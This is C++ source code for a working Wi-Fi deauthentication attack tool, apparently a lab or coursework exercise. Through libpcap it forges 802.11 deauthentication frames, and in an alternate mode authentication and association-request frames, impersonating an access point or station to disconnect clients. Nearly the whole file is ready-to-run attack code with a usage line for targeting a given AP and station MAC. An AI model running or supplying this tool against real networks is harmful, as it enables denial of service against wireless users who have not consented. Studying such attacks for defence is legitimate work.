#include "deauth.h"

int	g_isauth;
Mac ap, station = Mac::broadcastMac();

void	deauth_attack(pcap_t *handle)
{
	DeAuthPacket	packet;
	
	packet.radiotap_hdr_.version_ = 0;
	packet.radiotap_hdr_.pad_ = 0;
	packet.radiotap_hdr_.len_ = sizeof(RadioTapHdr);
	packet.radiotap_hdr_.present_ = RadioTapHdr::PRESENT::TX_FLAG | RadioTapHdr::PRESENT::RATE;
	packet.radiotap_hdr_.data_rate_ = 0x02;
	packet.radiotap_hdr_.zero_ = 0;
	packet.radiotap_hdr_.tx_flag_ = 0x0018;

	packet.dot11_hdr_.frame_control_ = Dot11Hdr::TYPE::MANAGEMENT;
	packet.dot11_hdr_.frame_control_ |= Dot11Hdr::SUBTYPE::DEAUTHENTICATION << 4;
	packet.dot11_hdr_.duration_ = 0x013a;
	packet.dot11_hdr_.addr1_ = station;
	packet.dot11_hdr_.addr2_ = ap;
	packet.dot11_hdr_.addr3_ = ap;
	packet.dot11_hdr_.seq_ctrl_ = 0x0000;
	packet.reason_code_ = 0x0007;

	for (int i = 0; i< DEAUTH_TRY_COUNT; i++)
	{
		packet.dot11_hdr_.seq_ctrl_ = i << 4;
		if (!station.isBroadcast()) // Station Unicast
		{
			if (i % 2)
			{
				packet.dot11_hdr_.addr1_ = ap;
				packet.dot11_hdr_.addr2_ = station;
				packet.dot11_hdr_.addr3_ = station;
			}
			else
			{
				packet.dot11_hdr_.addr1_ = station;
				packet.dot11_hdr_.addr2_ = ap;
				packet.dot11_hdr_.addr3_ = ap;
			}
		}
		int res = pcap_sendpacket(handle, (const u_char *)&packet, sizeof(DeAuthPacket));
		if (res != 0)
		{
			fprintf(stderr, "Error: Couldn't send packet\n");
			return ;
		}
		if (station.isBroadcast())
			printf("send deauth packet: AP broadcast\n");
		else {
			if (i % 2)
				printf("send deauth packet: Station unicast\n");
			else
				printf("send deauth packet: AP unicast\n");
		}
		sleep(1);
	}
}

void	auth_attack(pcap_t *handle)
{
	AuthPacket					auth_packet;
	AssociationRequestPacket	assoc_packet;

	// Authentication 1
	memset(&auth_packet, 0, sizeof(AuthPacket));
	auth_packet.radiotap_hdr_.len_ = 24;
	auth_packet.radiotap_hdr_.present_1_ = 0xa000402e;
	auth_packet.radiotap_hdr_.present_2_ = 0x00000820;

	auth_packet.dot11_hdr_.frame_control_ = Dot11Hdr::TYPE::MANAGEMENT;
	auth_packet.dot11_hdr_.frame_control_ |= Dot11Hdr::SUBTYPE::AUTHENTICATION << 4;
	auth_packet.dot11_hdr_.duration_ = 0x013a;
	auth_packet.dot11_hdr_.addr1_ = ap;
	auth_packet.dot11_hdr_.addr2_ = station;
	auth_packet.dot11_hdr_.addr3_ = ap;
	auth_packet.dot11_hdr_.seq_ctrl_ = 0x0000;

	auth_packet.auth_algo_ = 0x0000;
	auth_packet.auth_seq_ = 0x0001;
	auth_packet.status_code_ = 0x0000;

	// Association Request
	memset(&assoc_packet, 0, sizeof(AssociationRequestPacket));
	assoc_packet.radiotap_hdr_.len_ = sizeof(RadioTapHdr);

	assoc_packet.dot11_hdr_.frame_control_ = Dot11Hdr::TYPE::MANAGEMENT;
	assoc_packet.dot11_hdr_.duration_ = 0x013a;
	assoc_packet.dot11_hdr_.addr1_ = ap;
	assoc_packet.dot11_hdr_.addr2_ = station;
	assoc_packet.dot11_hdr_.addr3_ = ap;
	assoc_packet.dot11_hdr_.seq_ctrl_ = 0x0000;

	assoc_packet.capability_ = 0x0431;
	assoc_packet.listen_interval_ = 0x000a;

	// send
	for (int i = 0; i < AUTH_TRY_COUNT; i++)
	{
		int res = pcap_sendpacket(handle, (const u_char *)&auth_packet, sizeof(AuthPacket));
		if (res != 0)
		{
			fprintf(stderr, "Error: Couldn't send packet\n");
			return ;
		}
		printf("send auth packet\n");
		sleep(1);
		res = pcap_sendpacket(handle, (const u_char *)&assoc_packet, sizeof(AssociationRequestPacket));
		if (res != 0)
		{
			fprintf(stderr, "Error: Couldn't send packet\n");
			return ;
		}
		printf("send association request packet\n");
		sleep(1);
	}
}

int	main(int argc, char *argv[])
{
	if (argc < 3 || argc > 5)
	{
		fprintf(stderr, "syntax : %s <interface> <ap mac> [<station mac> [-auth]]\nsample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n", argv[0]);
		return (1);
	}
	char	*dev = argv[1];
	char	errbuf[PCAP_ERRBUF_SIZE];
	pcap_t	*handle;
	ap = Mac(argv[2]);
	if (argc >= 4)
		station = Mac(argv[3]);
	if (argc == 5 && !strcmp(argv[4], "-auth"))
		g_isauth = 1;

	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (!handle)
	{
		fprintf(stderr, "Error: Couldn't open device %s(%s)\n", dev, errbuf);
		return (1);
	}
	if (!g_isauth)
		deauth_attack(handle);
	else
		auth_attack(handle);
	pcap_close(handle);
	return (0);
}